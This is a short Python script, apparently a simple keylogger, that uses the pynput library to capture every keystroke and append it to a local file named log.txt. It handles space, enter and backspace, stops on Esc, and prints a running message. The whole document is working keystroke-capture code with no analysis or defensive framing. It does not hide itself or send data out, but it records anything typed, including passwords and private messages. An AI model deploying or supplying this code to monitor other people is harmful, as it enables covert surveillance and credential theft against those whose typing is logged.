from pynput.keyboard import Listener, Key

pressed_keys = set()

def on_press(key):
    if key == Key.esc:  # Stop listener on Esc
        return False
    if key not in pressed_keys:  # Avoid duplicates from held keys
        pressed_keys.add(key)
        try:
            letter = str(key).replace("'", "")
            if letter == "Key.space":
                letter = " "
            elif letter == "Key.enter":
                letter = "\n"
            elif letter == "Key.backspace":
                # Read the current content of the file
                try:
                    with open("log.txt", 'r') as f:
                        content = f.read()
                    # Remove the last character (if any)
                    if content:
                        content = content[:-1]
                        # Rewrite the file with the updated content
                        with open("log.txt", 'w') as f:
                            f.write(content)
                    return  # No need to write anything for backspace
                except Exception as e:
                    print(f"Error handling backspace: {e}")
                    return
            elif letter.startswith("Key."):  # Skip other special keys
                return
            # Write regular characters to the file
            with open("log.txt", 'a') as f:
                f.write(letter)
        except Exception as e:
            print(f"Error writing to file: {e}")

def on_release(key):
    if key in pressed_keys:
        pressed_keys.remove(key)

print("Keylogger running (press Esc to stop)...")
with Listener(on_press=on_press, on_release=on_release) as l:
    l.join()
